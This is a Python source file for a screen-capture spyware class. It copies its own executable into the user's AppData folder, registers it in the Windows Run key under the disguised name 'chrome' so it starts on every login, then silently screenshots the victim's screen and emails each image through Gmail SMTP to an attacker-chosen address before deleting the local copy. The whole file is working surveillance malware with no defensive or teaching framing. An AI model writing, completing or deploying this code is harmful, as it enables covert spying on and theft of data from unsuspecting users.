import shutil
import smtplib
import subprocess
import sys
import time
from PIL import ImageGrab
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

import os
import tempfile



class ScreenLogger:
    def __init__(self,Imagename,email_address,email_password,reserver_email):
       self.Imagename = Imagename
       self.email_address = email_address
       self.email_password = email_password
       self.reserve_email = reserver_email
       self.presistence()
       self.screen_logger()


    def presistence(self):
        payload_location = os.environ["appdata"] +"\\software.exe"
        if not os.path.exists(payload_location):
            shutil.copyfile(sys.executable,payload_location)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v chrome   /t REG_SZ /d "'+payload_location+'"',shell=True)

    def screen_logger(self):
        temp_dir = tempfile.gettempdir()
        os.chdir(temp_dir)
        image = ImageGrab.grab()
        image.save(self.Imagename)
        image.close()
        self.SendMail(self.Imagename, self.email_address, self.email_password, self.reserve_email)
        os.remove(self.Imagename)
    def SendMail(self,ImgFileName,email_address,email_password,sender_email):
        with open(ImgFileName, 'rb') as f:
            img_data = f.read()

        msg = MIMEMultipart()
        text = MIMEText("screenshot")
        msg.attach(text)
        image = MIMEImage(img_data)
        msg.attach(image)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as connection:

            connection.login(email_address, email_password )
            connection.sendmail(from_addr=email_address, to_addrs=sender_email,
            msg=msg.as_string())







    #msg.as_string()
